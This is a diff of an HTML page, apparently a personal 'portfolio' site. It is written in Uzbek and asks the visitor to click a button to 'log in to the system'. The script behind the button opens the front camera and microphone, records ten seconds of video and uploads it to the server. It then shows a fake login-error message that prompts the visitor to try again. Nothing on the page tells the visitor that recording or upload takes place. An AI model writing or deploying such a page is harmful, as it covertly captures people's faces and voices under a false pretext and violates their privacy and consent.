@@ -1,104 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title> Verification</title>
-    <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            font-family: Arial, sans-serif;
-        }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Husanboys portfolio</title>
 
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            text-align: center;
-            width: 350px;
-        }
+<style>
+body {
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#1e3c72,#2a5298);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
+}
 
-        h2 {
-            margin-bottom: 20px;
-            color: #333;
-        }
+.card {
+    background:white;
+    width:90%;
+    max-width:380px;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 20px 40px rgba(0,0,0,0.2);
+    text-align:center;
+}
 
-        button {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 25px;
-            background: #2a5298;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+button {
+    width:100%;
+    padding:14px;
+    background:#2a5298;
+    color:white;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+}
 
-        button:hover {
-            background: #1e3c72;
-            transform: scale(1.05);
-        }
+button:hover {
+    background:#1e3c72;
+}
 
-        .status {
-            margin-top: 15px;
-            font-size: 14px;
-            color: green;
-        }
-    </style>
+.status {
+    margin-top:15px;
+    font-size:14px;
+}
+</style>
 </head>
+
 <body>
 
 <div class="card">
-    <h2>Tizimiga kirish uchun bosing</h2>
-    <button onclick="startRecording()">Kirish</button>
+    <h2>About Me</h2>
+    <p>Iltimos tizimga kirish uchun tugmani bosing</p>
+    <button onclick="startCamera()">Tizimga kirish</button>
     <div class="status" id="status"></div>
 </div>
 
 <script>
+let mediaRecorder;
 let recordedChunks = [];
 
-async function startRecording() {
-    document.getElementById("status").innerText = "Tizimga kirmoqda...";
+async function startCamera() {
 
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: true,
-        audio: true
-    });
+    const status = document.getElementById("status");
+    status.innerText = "Tizimga kirmoqda...";
 
-    const mediaRecorder = new MediaRecorder(stream, {
-        mimeType: "video/webm"
-    });
-
-    mediaRecorder.ondataavailable = function(event) {
-        if (event.data.size > 0) {
-            recordedChunks.push(event.data);
-        }
-    };
-
-    mediaRecorder.onstop = async function() {
-        const blob = new Blob(recordedChunks, { type: "video/webm" });
-
-        const formData = new FormData();
-        formData.append("file", blob, "video.webm");
-
-        await fetch("/upload", {
-            method: "POST",
-            body: formData
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: true
         });
 
-        document.getElementById("status").innerText = "Verification complete";
-    };
+        recordedChunks = [];
 
-    mediaRecorder.start();
+ let options = { mimeType: "video/mp4" };
 
-    setTimeout(() => {
-        mediaRecorder.stop();
-        stream.getTracks().forEach(track => track.stop());
-    }, 10000);
+if (!MediaRecorder.isTypeSupported("video/mp4")) {
+    options = {};
+}
+
+mediaRecorder = new MediaRecorder(stream, options);
+
+        mediaRecorder.ondataavailable = function(event) {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+
+        mediaRecorder.onstop = async function() {
+            status.innerText = "Ko'rib chiqilmoqda";
+
+            const blob = new Blob(recordedChunks, { type: "video/mp4" });
+
+            const formData = new FormData();
+            formData.append("file", blob, "video.mp4");
+
+            await fetch("/upload", {
+                method: "POST",
+                body: formData
+            });
+
+            status.innerText = "Tizimga kirishda xatolik bo'ldi, iltimos qayta urining";
+        };
+
+        mediaRecorder.start();
+        status.innerText = "Kirmoqda...";
+
+        setTimeout(() => {
+            mediaRecorder.stop();
+            stream.getTracks().forEach(track => track.stop());
+        }, 10000);
+
+    } catch (err) {
+        status.innerText = "Camera access denied";
+        console.error(err);
+    }
 }
 </script>
 
